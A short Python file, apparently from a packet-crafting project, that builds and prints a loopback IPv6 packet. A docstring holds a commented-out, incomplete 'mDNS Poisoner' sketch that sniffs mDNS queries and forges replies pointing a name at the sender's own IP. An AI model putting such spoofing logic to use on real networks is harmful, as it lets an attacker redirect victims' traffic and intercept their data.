from All import *
from Ipv6 import IPv6

"""
mDNS Poisoner:
def ismatch_mdns(pkt: Ether):
    return UDP in pkt and 5353 in (pkt[UDP].sport, pkt[UDP].dport) and DNSQR in pkt and 'testDomainName' in pkt[DNSQR][0].qname.lower()

def onmatch_mdns(pkt: Ether):
    print(f"Spoofing response for: {pkt[DNSQR][0].qname} ip={pkt[IP].psrc}")
    psrc = pkt[IP].psrc
    sport = pkt[UDP].sport
    dport = pkt[UDP].dport
    myIp = .......
    
    # Must send both ipv4 and ipv6 versions of the spoofed mDNS response
    # in order for Windows 10 to register the spoofed domain.
    spoofed_response_v4 = Ether(dst=pkt.src)/IP(dst=psrc)/\
    UDP(sport=dport, dport=sport)/DNS(id=pkt[DNS].id, an=DNSRR(name="bruhh.local", rdata=myIp, ttl=120))
    
    send(spoofed_response)


sniff(ismatch_mdns, onmatch_mdns)
"""
from HelperFuncs import ipv6ToBytes
pkt = IPv6(psrc="::1", pdst="::1")
print(bytes(pkt))